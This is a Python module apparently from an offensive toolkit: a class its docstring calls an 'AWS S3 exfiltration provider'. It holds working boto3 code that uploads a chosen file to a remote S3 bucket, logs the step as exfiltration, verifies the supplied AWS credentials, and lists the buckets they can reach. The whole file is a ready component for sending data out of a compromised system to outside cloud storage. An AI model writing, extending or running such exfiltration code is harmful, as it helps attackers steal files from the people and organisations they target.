#!/usr/bin/env python3
"""
AWS S3 provider
"""

from pathlib import Path
from datetime import datetime
from .base_provider import BaseCloudProvider

class S3Provider(BaseCloudProvider):
    """AWS S3 exfiltration provider"""
    
    def __init__(self):
        """Initialize S3 provider"""
        super().__init__('AWS S3')
    
    def upload_file(self, filepath, bucket_name, aws_access_key, 
                   aws_secret_key, object_name=None, region='us-east-1'):
        """
        Upload file to S3
        
        Args:
            filepath: Path to file
            bucket_name: S3 bucket name
            aws_access_key: AWS access key ID
            aws_secret_key: AWS secret access key
            object_name: S3 object key (auto-generated if None)
            region: AWS region
            
        Returns:
            Upload result dict or None
        """
        try:
            import boto3
            from botocore.exceptions import ClientError
            
            print(f"[*] Exfiltrating to S3: {bucket_name}")
            
            # Get file info
            file_info = self.get_file_info(filepath)
            print(f"[*] File: {file_info['filename']} ({file_info['size_mb']:.2f} MB)")
            
            # Create S3 client
            s3_client = boto3.client(
                's3',
                aws_access_key_id=aws_access_key,
                aws_secret_access_key=aws_secret_key,
                region_name=region
            )
            
            # Generate object name if not provided
            if object_name is None:
                object_name = self.generate_backup_path(file_info['filename'])
            
            print(f"[*] Uploading to: s3://{bucket_name}/{object_name}")
            
            # Upload file
            s3_client.upload_file(filepath, bucket_name, object_name)
            
            print(f"[+] Upload successful!")
            
            return {
                'service': self.service_name,
                'bucket': bucket_name,
                'object_key': object_name,
                'region': region,
                'url': f"s3://{bucket_name}/{object_name}",
                'size_bytes': file_info['size']
            }
        
        except ImportError:
            print("[-] boto3 not installed")
            print("[!] Install: pip install boto3")
            return None
        except ClientError as e:
            print(f"[-] S3 client error: {e}")
            return None
        except Exception as e:
            print(f"[-] S3 upload error: {e}")
            return None
    
    def check_credentials(self, aws_access_key, aws_secret_key, region='us-east-1'):
        """
        Verify AWS credentials
        
        Args:
            aws_access_key: AWS access key
            aws_secret_key: AWS secret key
            region: AWS region
            
        Returns:
            True if valid
        """
        try:
            import boto3
            from botocore.exceptions import ClientError
            
            client = boto3.client(
                's3',
                aws_access_key_id=aws_access_key,
                aws_secret_access_key=aws_secret_key,
                region_name=region
            )
            
            # Try to list buckets
            client.list_buckets()
            return True
        
        except ClientError:
            return False
        except Exception:
            return False
    
    def list_buckets(self, aws_access_key, aws_secret_key, region='us-east-1'):
        """List available S3 buckets"""
        try:
            import boto3
            
            client = boto3.client(
                's3',
                aws_access_key_id=aws_access_key,
                aws_secret_access_key=aws_secret_key,
                region_name=region
            )
            
            response = client.list_buckets()
            return [bucket['Name'] for bucket in response.get('Buckets', [])]
        
        except Exception as e:
            print(f"[-] Error listing buckets: {e}")
            return []